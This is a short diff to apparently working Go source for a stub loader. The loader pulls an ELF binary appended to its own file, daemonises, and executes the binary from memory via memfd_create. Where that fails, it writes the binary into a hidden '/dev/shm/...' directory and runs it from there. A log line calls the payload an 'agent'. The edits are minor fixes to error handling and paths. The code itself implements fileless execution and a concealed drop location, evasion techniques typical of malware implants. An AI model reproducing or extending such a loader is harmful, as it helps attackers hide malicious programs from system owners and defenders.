@@ -34,7 +34,6 @@ func runFromMemory(procName string, buffer []byte) {
 	case 1:
 		// Fork failed!
 		log.Fatal("fork failed")
-		break
 	default:
 		// Parent exiting...
 		os.Exit(0)
@@ -45,11 +44,14 @@ func runFromMemory(procName string, buffer []byte) {
 	_ = syscall.Chdir("/")
 
 	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
-	syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
+	err := syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
+	if err != nil {
+		log.Fatal(err)
+	}
 	file.Close()
 
 	progWithArgs := append([]string{procName}, os.Args[1:]...)
-	err := syscall.Exec(fdPath, progWithArgs, nil)
+	err = syscall.Exec(fdPath, progWithArgs, nil)
 	if err == nil {
 		log.Println("agent started from memory using memfd_create")
 		return
@@ -57,18 +59,18 @@ func runFromMemory(procName string, buffer []byte) {
 
 	// older kernel
 	log.Printf("memfd_create failed: %v, trying shm_open", err)
-	shmPath := "/dev/shm/..."
+	shmPath := "/dev/shm/.../"
 	if _, err := os.Stat(shmPath); os.IsNotExist(err) {
 		err = os.Mkdir(shmPath, 0700)
 		if err != nil {
 			log.Fatal(err)
 		}
 	}
-	err = ioutil.WriteFile(shmPath+"/"+procName, buffer, 0755)
+	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
 	if err != nil {
 		log.Fatal(err)
 	}
-	cmd := exec.Command(shmPath+"/"+procName, os.Args[1:]...)
+	cmd := exec.Command(shmPath+procName, os.Args[1:]...)
 	err = cmd.Start()
 	if err != nil {
 		log.Fatal(err)
@@ -80,7 +82,7 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	// length of the whole stub file
+	// locate the ELF file
 	elfbegining := bytes.LastIndex(wholeStub, []byte(utils.Sep))
 	elfBytes := wholeStub[(elfbegining + len(utils.Sep)):]
 
